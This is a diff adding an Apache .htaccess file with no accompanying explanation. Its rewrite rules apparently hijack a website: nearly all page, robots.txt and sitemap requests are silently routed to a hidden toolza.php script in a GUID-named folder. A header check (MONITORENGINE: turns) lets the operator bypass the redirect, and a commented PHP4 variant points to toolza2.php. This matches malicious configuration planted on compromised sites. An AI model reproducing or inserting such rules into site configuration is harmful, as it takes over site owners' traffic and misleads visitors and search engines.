@@ -1,0 +1,24 @@
+RewriteEngine On
+RewriteCond %{HTTP:MONITORENGINE} !^turns$
+RewriteCond %{REQUEST_URI} ^[^\.]*$ [OR]
+RewriteCond %{REQUEST_URI} ^.*((\.(php|html|htm|php4|php5))|robots.txt|sitemap.xml|sitemap_[0-9]{1,2}.xml)$
+RewriteRule ^.*$ /34fa1838-419b-48a1-bc2f-69c750703dcc/toolza.php [L]
+
+RewriteEngine On
+
+RewriteRule ^baton/([0-9]*)$ index.php?id=$1 [L]
+
+RewriteCond %{REQUEST_FILENAME} ^/toolza\.php\?sdfjknsjdkfn$
+RewriteRule ^.*$ toolza.php [L]
+
+RewriteCond %{REQUEST_FILENAME} !^.*toolza\.php.*$
+RewriteRule ^.*(\.(php|html|htm|php4|php5)|sitemap\.xml|robots\.txt).*$ toolza.php
+
+
+# for php v4
+#RewriteEngine On
+#RewriteCond %{ENV:REDIRECT_FINISH} !^$
+#RewriteRule ^.*$ - [L]
+#RewriteRule ^baton/([0-9]*)$ index.php?id=$1 [L]
+#RewriteCond %{REQUEST_FILENAME} !^.*$
+#RewriteRule ^.*$ toolza2.php?id=34543 [QSA,E=FINISH:1]
